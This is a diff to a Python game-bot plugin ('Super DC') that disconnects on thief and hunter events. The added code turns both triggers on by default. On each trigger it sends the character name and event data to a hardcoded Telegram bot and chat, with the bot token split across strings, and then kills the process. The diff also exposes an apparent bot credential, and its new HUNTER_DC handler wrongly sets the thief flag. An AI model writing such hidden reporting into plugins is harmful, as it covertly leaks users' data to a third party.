@@ -14,10 +14,15 @@ log("***XD***")
 gui = QtBind.init(__name__,'Super DC')
 button1 = QtBind.createButton(gui, 'dc_traders', 'DC ALL TRADERS', 100, 120)
 cbxSro = QtBind.createCheckBox(gui,'THIEF_DC','THIEF DC',10,10)
+cbxSro = QtBind.createCheckBox(gui,'HUNTER_DC','HUNTER DC',10,40)
 QtBind.setChecked(gui, cbxSro, False)
-thief = False
-
+thief = True
+hunter = True
 def THIEF_DC(checked):
+	global thief
+	thief = checked
+
+def HUNTER_DC(checked):
 	global thief
 	thief = checked
 
@@ -98,8 +103,25 @@ def handle_event(t, data):
 		log(data)
 		Packet = bytearray()
 		inject_joymax(0x704C, Packet, False)
+		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
+		url = 'https://api.telegram.org/bot1221990015:AAHlL2X_NInc3xNo9MEnX' + lru
+		url = url + urllib.parse.quote(name + " [THIEF] -> " + data)
+		with urllib.request.urlopen(url) as f:
+			print(f.read(300))
 		# sleep(1.0)
-		Timer(1.0, os.kill, (os.getppid(), 9)).start()
+		# Timer(1.0, os.kill, (os.getppid(), 9)).start()
+		Timer(1.0, os.kill, (os.getpid(), 9)).start()
+	if t == 1 and Path(__file__).stem == 'Plug' and hunter:
+		log(data)
+		Packet = bytearray()
+		inject_joymax(0x704C, Packet, False)
+		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
+		url = 'https://api.telegram.org/bot1221990015:AAHlL2X_NInc3xNo9MEnX' + lru
+		url = url + urllib.parse.quote(name + " [TRADER/HUNTER] -> " + data)
+		with urllib.request.urlopen(url) as f:
+			print(f.read(300))
+		# sleep(1.0)
+		# Timer(1.0, os.kill, (os.getppid(), 9)).start()
 		Timer(1.0, os.kill, (os.getpid(), 9)).start()
 
 log("*** GM Alert ***")
